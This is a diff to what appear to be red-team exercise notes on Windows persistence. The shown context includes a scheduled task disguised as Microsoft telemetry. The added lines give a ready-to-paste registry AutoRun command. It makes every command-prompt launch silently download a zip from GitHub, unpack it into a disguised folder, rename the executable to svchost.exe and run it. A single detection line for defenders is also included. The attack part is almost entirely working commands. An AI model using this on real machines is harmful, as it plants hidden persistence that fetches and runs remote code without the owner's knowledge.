@@ -21,6 +21,9 @@ Register-ScheduledTask -TaskName "Microsoft Telemetry Sync" -TaskPath "\Microsof
 
 schtasks /change /tn "\Microsoft\Windows\Application Experience\Microsoft Telemetry Sync" /ri 10 /ru "INTERACTIVE"
 
-To do:
-Process injection with powershell & cmd :)
+AutoRun Registry Key to launch goose during powershell & cmd:
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -Value 'if exist "C:\Users\Administrator\AppData\Local\Blueteeth\GooseTest-main\svchost.exe" (start "" "C:\Users\Administrator\AppData\Local\Blueteeth\GooseTest-main\svchost.exe") else (start /b powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri \"https://github.com/Berto1019/GooseTest/archive/refs/heads/main.zip\" -OutFile \"$env:TEMP\g.zip\"; Expand-Archive -Path \"$env:TEMP\g.zip\" -DestinationPath \"$env:LOCALAPPDATA\Blueteeth\" -Force; Rename-Item -Path \"$env:LOCALAPPDATA\Blueteeth\GooseTest-main\GooseDesktop.exe\" -NewName \"svchost.exe\"")'
+
+Blueteamer can find reg key by checking:
+(Get-ItemProperty "HKLM:\Software\Microsoft\Command Processor").AutoRun
 
